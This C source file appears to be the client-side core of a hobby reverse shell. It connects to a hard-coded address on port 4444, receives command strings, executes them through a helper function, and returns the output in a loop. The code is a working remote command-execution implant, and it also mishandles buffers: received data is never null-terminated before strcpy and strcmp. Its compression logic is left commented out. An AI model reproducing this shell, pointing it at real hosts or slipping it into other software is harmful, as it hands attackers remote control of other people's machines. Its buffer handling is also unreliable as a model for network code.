#include <zlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include "server_fn/pipe_io.h"
#include "server_fn/socket_related.h"
#include "general_fn/error_handling.h"
#include "general_fn/compress_related.h"
#include "general_fn/conversion_related.h"

#define BUFFER_SIZE 16384
#define HOST "127.0.0.1"
#define PORT 4444

int main() {
    int socket = connect_socket(HOST, PORT);
    printf("[+]Connection with Client was Established.\n\033[0m");
    
    char signal[2];
    int COMPRESS = 0;
    if (recv(socket, signal, 2, 0) == -1) error_output("Could Not Receive");

    COMPRESS = atoi(signal);

    //char* command = NULL;
    //char* tmp = NULL;

    //if (!COMPRESS) {
        char command[BUFFER_SIZE];
    //}
    
    char output[BUFFER_SIZE];

    while (1) {
        /*if (COMPRESS) {

        } else {*/
            if (recv(socket, command, BUFFER_SIZE, 0) == -1) error_output("Could Not Receive");

            if (strcmp(command, "") == 0) {
                printf("\033[34m[+]Client Disconnected.\n");
                break;
            }

            char tmp[BUFFER_SIZE];
            strcpy(tmp, command);

            printf("\033[34m[+]Received Command: \033[32m%s\n", tmp);

            command_output(tmp, output, BUFFER_SIZE);

            if (send(socket, output, strlen(output), 0) == -1) error_output("Could Not Send");
        //}
        printf("\033[34m[+]Sent Desired Output.\n");

        bzero(tmp, BUFFER_SIZE);
        bzero(output, BUFFER_SIZE);
        bzero(command, BUFFER_SIZE);
    }

    //if (COMPRESS) free(command);
    //free(tmp);
    return 0;
}